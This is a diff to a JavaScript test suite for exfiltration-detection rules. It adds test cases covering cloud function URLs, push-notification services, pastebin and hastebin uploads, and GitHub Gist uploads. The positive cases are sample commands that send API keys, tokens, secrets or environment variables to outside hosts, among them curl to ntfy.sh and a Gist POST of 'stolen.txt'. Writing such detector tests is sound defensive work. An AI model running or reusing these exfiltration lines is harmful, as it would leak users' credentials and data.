@@ -23,8 +23,8 @@ describe('Exfiltration Rules', () => {
       `Rule ${ruleId} ${shouldMatch ? 'should' : 'should not'} match: ${content.substring(0, 100)}`);
   }
 
-  test('should have 27 exfiltration rules', () => {
-    assert.strictEqual(rules.length, 27);
+  test('should have 35 exfiltration rules', () => {
+    assert.strictEqual(rules.length, 35);
   });
 
   describe('exfil-base64-in-url', () => {
@@ -571,6 +571,137 @@ describe('Exfiltration Rules', () => {
     test('does not flag pickle.dumps of normal objects', () => {
       testRule('exfil-python-pickle-exfil',
         'data = pickle.dumps({"result": "ok"})\nprint(data)',
+        false);
+    });
+  });
+
+  // ============================================
+  // Cloud Function Exfiltration
+  // ============================================
+  describe('exfil-aws-lambda-url', () => {
+    test('detects AWS Lambda Function URL POST', () => {
+      testRule('exfil-aws-lambda-url',
+        'fetch("https://abc123.lambda-url.us-east-1.on.aws/", {method:"POST",body:data})',
+        true);
+    });
+    test('does not flag regular AWS service URL', () => {
+      testRule('exfil-aws-lambda-url',
+        'fetch("https://s3.amazonaws.com/bucket/key")',
+        false);
+    });
+  });
+
+  describe('exfil-gcp-function-url', () => {
+    test('detects GCP Cloud Function URL', () => {
+      testRule('exfil-gcp-function-url',
+        'await axios.post("https://us-central1-myproject.cloudfunctions.net/exfilHandler", payload)',
+        true);
+    });
+    test('does not flag random domain', () => {
+      testRule('exfil-gcp-function-url',
+        'fetch("https://api.example.com/data")',
+        false);
+    });
+  });
+
+  describe('exfil-vercel-function', () => {
+    test('detects Vercel /api route as exfil target', () => {
+      testRule('exfil-vercel-function',
+        'fetch("https://my-app.vercel.app/api/collect", {method:"POST",body:JSON.stringify(env)})',
+        true);
+    });
+    test('does not flag Vercel page URL', () => {
+      testRule('exfil-vercel-function',
+        'const url = "https://my-app.vercel.app"',
+        false);
+    });
+  });
+
+  describe('exfil-cloudflare-workers', () => {
+    test('detects Cloudflare Workers POST', () => {
+      testRule('exfil-cloudflare-workers',
+        'await fetch("https://my-worker.workers.dev/", {method:"POST",body:secrets})',
+        true);
+    });
+    test('does not flag Cloudflare CDN hostname', () => {
+      testRule('exfil-cloudflare-workers',
+        'const cdn = "https://static.example.com/img.png"',
+        false);
+    });
+  });
+
+  // ============================================
+  // Push Notification Exfiltration
+  // ============================================
+  describe('exfil-ntfy-push', () => {
+    test('detects ntfy.sh POST with credentials', () => {
+      testRule('exfil-ntfy-push',
+        'curl -d "$API_KEY" https://ntfy.sh/my-secret-topic',
+        true);
+    });
+    test('detects axios post to ntfy.sh', () => {
+      testRule('exfil-ntfy-push',
+        'await axios.post("https://ntfy.sh/hacker-channel", { body: token })',
+        true);
+    });
+    test('does not flag ntfy.sh in comments', () => {
+      testRule('exfil-ntfy-push',
+        '// see: https://ntfy.sh/docs for notification service',
+        false);
+    });
+  });
+
+  describe('exfil-pushover-api', () => {
+    test('detects Pushover API URL', () => {
+      testRule('exfil-pushover-api',
+        'axios.post("https://api.pushover.net/1/messages.json", {token, user, message: secret})',
+        true);
+    });
+    test('does not flag unrelated API', () => {
+      testRule('exfil-pushover-api',
+        'fetch("https://api.example.com/notify")',
+        false);
+    });
+  });
+
+  // ============================================
+  // Pastebin / Code Sharing Exfiltration
+  // ============================================
+  describe('exfil-pastebin-upload', () => {
+    test('detects pastebin.com API upload', () => {
+      testRule('exfil-pastebin-upload',
+        'curl https://pastebin.com/api/api_post.php -d "api_paste_code=${secrets}"',
+        true);
+    });
+    test('detects hastebin upload', () => {
+      testRule('exfil-pastebin-upload',
+        'fetch("https://hastebin.com/documents", {method:"POST",body:token})',
+        true);
+    });
+    test('does not flag reading from pastebin', () => {
+      testRule('exfil-pastebin-upload',
+        'const result = await fetch("https://pastebin.com/raw/abc123")',
+        false);
+    });
+  });
+
+  // ============================================
+  // GitHub Gist Exfiltration
+  // ============================================
+  describe('exfil-github-gist-upload', () => {
+    test('detects GitHub Gist API POST with dynamic content', () => {
+      testRule('exfil-github-gist-upload',
+        'fetch("https://api.github.com/gists", {method:"POST", body: JSON.stringify({files:{"stolen.txt":{content:env}},public:false})})',
+        true);
+    });
+    test('detects curl to GitHub Gist API', () => {
+      testRule('exfil-github-gist-upload',
+        'curl -X POST https://api.github.com/gists -d \'{"files":{"data.txt":{"content":"${secrets}"}},"public":false}\'',
+        true);
+    });
+    test('does not flag reading a Gist', () => {
+      testRule('exfil-github-gist-upload',
+        'fetch("https://api.github.com/gists/abc123")',
         false);
     });
   });
